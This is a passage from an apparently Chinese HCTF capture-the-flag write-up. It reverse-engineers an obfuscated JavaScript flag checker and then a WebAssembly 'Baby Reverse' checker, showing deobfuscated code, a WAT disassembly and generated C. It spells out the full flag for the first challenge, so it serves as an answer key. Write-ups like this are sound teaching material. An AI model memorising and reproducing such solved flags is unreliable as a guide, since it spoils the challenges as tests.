function_">stringToHex</span>(j[<span class="number">0x0</span>]) ^ <span class="title function_">stringToHex</span>(j[<span class="number">0x1</span>])) != <span class="number">0x1613</span>;</span><br><span class="line">        <span class="comment">// 第四个判断条件</span></span><br><span class="line">        <span class="comment">// if (challenge4_1 || challenge4_2) &#123;</span></span><br><span class="line">        <span class="comment">//     return ![];</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// x.charCodeAt() * input[1].length</span></span><br><span class="line">        k = <span class="function"><span class="params">x</span> =&gt;</span> x[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)]() * inputs[<span class="number">0x1</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)];</span><br><span class="line">        <span class="comment">// 分割后的第一段每一个字符 * 第二段的长度，再加起来</span></span><br><span class="line">        challenge5 = <span class="title function_">h</span>(j[<span class="number">0x0</span>], k);</span><br><span class="line">        <span class="comment">// 第五个判断条件</span></span><br><span class="line">        <span class="keyword">if</span> (challenge5 != <span class="number">0x2f9b5072</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 确定 flag 一共有五段</span></span><br><span class="line">        <span class="comment">// 第五段的前四个字符 - 0x48a05362 == n % 0x2f9b5072</span></span><br><span class="line">        m = <span class="title function_">stringToHex</span>(inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x0</span>, <span class="number">0x4</span>)) - <span class="number">0x48a05362</span> == n % challenge5;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">repreat</span>(<span class="params">char, count</span>) &#123;  <span class="comment">// char * count</span></span><br><span class="line">            <span class="keyword">var</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0x0</span>; i &lt; count; i++) &#123;</span><br><span class="line">                result += char;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        challenge6_1 = !m;</span><br><span class="line">        <span class="comment">// 第五段第六个字符 * 2 ！= 第五段最后四个字符（除去了“&#125;”）</span></span><br><span class="line">        challenge6_2 = <span class="title function_">repreat</span>(inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x5</span>, <span class="number">0x1</span>), <span class="number">0x2</span>) == inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](-<span class="number">0x5</span>, <span class="number">0x4</span>);</span><br><span class="line">        <span class="comment">// 第五段的最后一个字符（除去了“&#125;”） - 第五段第五个字符 == 1</span></span><br><span class="line">        challenge6_3 = inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](-<span class="number">0x2</span>, <span class="number">0x1</span>) - inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) != <span class="number">0x1</span>;</span><br><span class="line">        <span class="comment">// 第六个判断条件</span></span><br><span class="line">        <span class="keyword">if</span> (challenge6_1 || challenge6_2 || challenge6_3) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        a = inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x2</span>)</span><br><span class="line">        b = inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x1</span>)</span><br><span class="line">        c = inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]</span><br><span class="line">        <span class="comment">// 第五段第七第八个字符的 hex == 第五段第七个字符 * 第五段的长度 * 5</span></span><br><span class="line">        o = <span class="title function_">stringToHex</span>(a)[<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x2</span>) == b[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)]() * c * <span class="number">0x5</span>;</span><br><span class="line">        challenge7_1 = o;</span><br><span class="line">        <span class="comment">// 第五段第五个字符 == &#x27;2&#x27;</span></span><br><span class="line">        <span class="comment">// 根据 challenge6_3 得出第五段最后一个字符为 3</span></span><br><span class="line">        challenge7_2 = inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) == <span class="number">0x2</span>;</span><br><span class="line">        <span class="comment">// 第五段第七第八个字符 == 第五段第八个字符 * 2</span></span><br><span class="line">        challenge7_3 = a == <span class="title function_">repreat</span>(inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x7</span>, <span class="number">0x1</span>), <span class="number">0x2</span>);</span><br><span class="line">        <span class="comment">// 最终的判断条件</span></span><br><span class="line">        <span class="keyword">return</span> challenge7_1 &amp;&amp; challenge7_2 &amp;&amp; challenge7_3;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">        <span class="variable language_">console</span>[<span class="string">&#x27;log&#x27;</span>](<span class="string">&#x27;gg&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> ![];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// var input = document[_0xa180(&#x27;0x32&#x27;)](_0xa180(&#x27;0x33&#x27;))[&#x27;value&#x27;];</span></span><br><span class="line">    <span class="comment">// 修改为从 query 获取 GET 参数方便调试</span></span><br><span class="line">    input = <span class="keyword">function</span>(<span class="params">name</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> r = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substr</span>(<span class="number">1</span>).<span class="title function_">match</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&quot;(^|&amp;)&quot;</span> + name + <span class="string">&quot;=([^&amp;]*)(&amp;|$)&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span>(r != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">decodeURI</span>(r[<span class="number">2</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;(<span class="string">&#x27;input&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (input == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x34&#x27;</span>)](<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x35&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> ![];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="title function_">check</span>(input);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x36&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x37&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>[<span class="string">&#x27;onload&#x27;</span>] = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// window.console.clear();window.console.log(&#x27;Welcome to HCTF :&gt;&#x27;)</span></span><br><span class="line">    <span class="comment">//setInterval(_0xa180(&#x27;0x38&#x27;), 0x32); // 干扰 console</span></span><br><span class="line">    <span class="title function_">test</span>();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>主要的判断逻辑在 check 函数里，首先看到最后的 <code>inputs[0x4]</code> 可以确定输入一共有五段，以下划线“_”分割，并且已知以“hctf{”开头，以“}”结尾。推测<code>hctf&#123;xxxx_xxxx_xxxx_xxxx_xxxx&#125;</code></p>
<p>在 challenge1 处需要的条件是</p>
<ol>
<li>(第一段的最后两个字符的 hex ^ ‘{‘的 hex) % 第一段长度 == 5，可知第一段长度为 7</li>
</ol>
<p>在 challenge2 处需要的条件是</p>
<ol>
<li>第三段的 base32 除去等号的 hex ^ 0x53a3f32 == 0x4b7c0a73</li>
</ol>
<p>由此可以计算出第三段的 base32 除去等号的 hex 为 0x4e463541，转为 base32 为 NF5A====，解码为 iz，推测<code>hctf&#123;xx_xxxx_iz_xxxx_xxxx&#125;</code></p>
<p>在 challenge3 处需要的条件是</p>
<ol>
<li>第四段的 base32 除去等号的 hex ^ 0x4b7c0a73 == 0x4315332</li>
</ol>
<p>由此可以计算出第四段的 base32 除去等号的 hex 为 0x4f4d5941，转为 base32 为 OMYA====，解码为 s0，推测<code>hctf&#123;xx_xxxx_iz_s0_xxxx&#125;</code></p>
<p>在 challenge4 处需要的条件是</p>
<ol>
<li>第二段中必须包含一个’3’</li>
<li>第二段以’3’分割，前后的长度相等</li>
<li>前后 hex 异或得到的结果是 0x1613，</li>
</ol>
<p>由此得出第二段中间为 3，推测<code>hctf&#123;xx_xx3xx_iz_s0_xxxx&#125;</code></p>
<p>在 challenge5 处需要的条件是</p>
<ol>
<li>第二段分割以后的第一段，即’3’之前的每一个字符 * 第二段的长度，再加起来 == 0x2f9b5072</li>
</ol>
<p>假设第二段长度为 5，则 0x2f9b5072/5 除不尽，那么第二段长度为 7，得出第二段第一部分的和为 114108118，转为字符串为 rev</p>
<p>再根据 challenge4.3 得出第二段后面的字符串 hex 为 0x726576 ^ 0x1613=0x727365，转为字符串为 rse，推测<code>hctf&#123;xx_rev3rse_iz_s0_xxxx&#125;</code></p>
<p>在 challenge6 处需要的条件是</p>
<ol>
<li>第五段的前四个字符 hex - 0x48a05362 == (0x4315332 * 0x4b7c0a73 * 第一段的长度) % 0x2f9b5072</li>
<li>第五段第六个字符 + 第五段第六个字符 ！= 第五段除去’}’外最后五个字符，即 xxxx}中的 xxxx</li>
<li>第五段的倒数第二个字符 - 第五段第五个字符 == 1</li>
</ol>
<p>根据 challenge1 的结论以及 challenge6.1 可以算出第五段前四个字符的 hex 为 0x68347246，转为字符串为 h4rd，推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rdxxxx&#125;</code></p>
<p>在 challenge7 处需要的条件是</p>
<ol>
<li>第五段第七和第八个字符的 hex 数字 == 第五段第七个字符 * 第五段的长度 * 5</li>
<li>第五段第五个字符 == ‘2’</li>
<li>第五段第七第八个字符 == 第五段第八个字符 + 第五段第吧个字符，即第五段第七和第八个字符相同</li>
</ol>
<p>根据 challenge7.2 可知，推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd2xxxxxxx&#125;</code></p>
<p>根据 challenge6.3 可知，推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd2xxxxxx3&#125;</code></p>
<p>根据附加条件 1：<code>flag.substr(-5,3)==&quot;333&quot;</code>，推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd2xxx3333&#125;</code></p>
<p>根据附加条件 2：<code>flag.substr(-8,1)==&quot;3&quot;</code>可知第五段长度为 8+5=13，并且第六个字符为’3’，推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd23xx3333&#125;</code></p>
<p>根据 challenge7.1 可以计算出第五段第七第八个字符的 hex 为 0x6565，转为字符串为 ee，推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd23ee3333&#125;</code></p>
<p>根据 challenge1 以及附加条件 4：<code>sha256(flag) == &quot;d3f154b641251e319855a73b010309a168a12927f3873c97d2e5163ea5cbb443&quot;</code></p>
<p>最终爆破出第一段最后两个字符为 j5，得到 flag 为：<code>hctf&#123;j5_rev3rse_iz_s0_h4rd23ee3333&#125;</code></p>
<h1 id="Baby-Reverse-200"><a href="#Baby-Reverse-200" class="headerlink" title="Baby Reverse(200)"></a>Baby Reverse(200)</h1><p>打开网页源码在 JavaScript 里对输入的字符串进行了处理</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btnCheck = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btnCheck&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> tbxFlag = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> txtStatus = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;status&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// var _debug_asm;</span></span><br><span class="line"><span class="comment">// var _debug_mem;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_c_string</span>(<span class="params">buf, index, s</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; s.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        buf[index + i] = s.<span class="title function_">charCodeAt</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[index + i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;flag.wasm&#x27;</span>)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">arrayBuffer</span>())</span><br><span class="line">.<span class="title function_">then</span>(<span class="title class_">WebAssembly</span>.<span class="property">instantiate</span>)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">mod</span> =&gt;</span> mod.<span class="property">instance</span>)</span><br><span class="line">.<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">asm</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> mem = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(asm.<span class="property">exports</span>.<span class="property">memory</span>.<span class="property">buffer</span>);</span><br><span class="line">    <span class="comment">// _debug_mem = mem;</span></span><br><span class="line">    <span class="comment">// _debug_asm = asm;</span></span><br><span class="line"></span><br><span class="line">    btnCheck.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> flag = tbxFlag.<span class="property">value</span>;</span><br><span class="line">        <span class="comment">// console.log(flag);</span></span><br><span class="line">        <span class="keyword">var</span> buf_addr = asm.<span class="property">exports</span>.<span class="title function_">get_buf</span>();</span><br><span class="line">        <span class="title function_">set_c_string</span>(mem, buf_addr, flag);</span><br><span class="line">        <span class="keyword">if</span>(asm.<span class="property">exports</span>.<span class="title function_">check_flag</span>(buf_addr))&#123;</span><br><span class="line">            txtStatus.<span class="property">innerText</span> = (<span class="keyword">new</span> <span class="title class_">Date</span>()).<span class="title function_">toLocaleString</span>() + <span class="string">&#x27; * - * - * Correct flag! * - * - *&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            txtStatus.<span class="property">innerText</span> = (<span class="keyword">new</span> <span class="title class_">Date</span>()).<span class="title function_">toLocaleString</span>() + <span class="string">&#x27; Wrong flag&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ready&#x27;</span>); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>可以看到最后交给了 flag.wasm 处理，wasm 是 WebASsembly 的二进制格式文件，下载 flag.wasm 使用 wabt 进行逆向。首先将二进制格式的 flag.wasm 转换为文本格式 wat，懒得下载的可以使用 <a target="_blank" rel="noopener" href="https://webassembly.github.io/wabt/demo/wasm2wat/"> 在线工具</a>。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">  (type $t0 (func (result i32)))</span><br><span class="line">  (type $t1 (func (param i32) (result i32)))</span><br><span class="line">  (func $get_buf (export &quot;get_buf&quot;) (type $t0) (result i32)</span><br><span class="line">    (i32.const 80))</span><br><span class="line">  (func $check_flag (export &quot;check_flag&quot;) (type $t1) (param $p0 i32) (result i32)</span><br><span class="line">    (local $l1 i32) (local $l2 i32)</span><br><span class="line">    (local.set $l1</span><br><span class="line">      (i32.const 0))</span><br><span class="line">    (local.set $l2</span><br><span class="line">      (i32.const 0))</span><br><span class="line">    (loop $L0</span><br><span class="line">      (local.set $l1</span><br><span class="line">        (i32.or</span><br><span class="line">          (i32.xor</span><br><span class="line">            (i32.shr_s</span><br><span class="line">              (i32.shl</span><br><span class="line">                (i32.xor</span><br><span class="line">                  (i32.load8_u</span><br><span class="line">                    (i32.add</span><br><span class="line">                      (local.get $p0)</span><br><span class="line">                      (local.get $l2)))</span><br><span class="line">                  (i32.load8_u</span><br><span class="line">                    (i32.add</span><br><span class="line">                      (local.get $l2)</span><br><span class="line">                      (i32.const 16))))</span><br><span class="line">                (i32.const 24))</span><br><span class="line">              (i32.const 24))</span><br><span class="line">            (i32.const 66))</span><br><span class="line">          (local.get $l1)))</span><br><span class="line">      (br_if $L0</span><br><span class="line">        (i32.ne</span><br><span class="line">          (local.tee $l2</span><br><span class="line">            (i32.add</span><br><span class="line">              (local.get $l2)</span><br><span class="line">              (i32.const 1)))</span><br><span class="line">          (i32.const 23))))</span><br><span class="line">    (i32.eqz</span><br><span class="line">      (local.get $l1)))</span><br><span class="line">  (table $T0 0 funcref)</span><br><span class="line">  (memory $memory (export &quot;memory&quot;) 1)</span><br><span class="line">  (data $d0 (i32.const 16) &quot;$.#%9\0a&#x27;..-\15&#x27; \0311&#x27;/ .;?B&quot;)</span><br><span class="line">  (data $d1 (i32.const 48) &quot;flag&#123;ThisFlagIsFake&#125;\00&quot;))</span><br></pre></td></tr></table></figure>

<p>直接看反汇编代码还是有点复杂，可以进一步将其反编译为 C 代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __FLAG_H_GENERATED_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __FLAG_H_GENERATED_</span></span><br><span class="line"><span class="comment">/* Automically generated by wasm2c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;wasm-rt.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> WASM_RT_MODULE_PREFIX</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WASM_RT_MODULE_PREFIX</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WASM_RT_PASTE_(x, y) x ## y</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WASM_RT_PASTE(x, y) WASM_RT_PASTE_(x, y)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WASM_RT_ADD_PREFIX(x) WASM_RT_PASTE(WASM_RT_MODULE_PREFIX, x)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* TODO(binji): only use stdint.h types in header */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint8_t</span> u8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int8_t</span> s8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint16_t</span> u16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int16_t</span> s16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> u32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int32_t</span> s32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int64_t</span> s64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">float</span> f32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">double</span> f64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">WASM_RT_ADD_PREFIX</span><span class="params">(init)</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* export: &#x27;memory&#x27; */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="title function_">wasm_rt_memory_t</span> <span class="params">(*WASM_RT_ADD_PREFIX(Z_memory))</span>;</span><br><span class="line"><span class="comment">/* export: &#x27;get_buf&#x27; */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="title function_">u32</span> <span class="params">(*WASM_RT_ADD_PREFIX(Z_get_bufZ_iv))</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="comment">/* export: &#x27;check_flag&#x27; */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="title function_">u32</span> <span class="params">(*WASM_RT_ADD_PREFIX(Z_check_flagZ_ii))</span><span class="params">(u32)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  <span class="comment">/* __FLAG_H_GENERATED_ */</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span 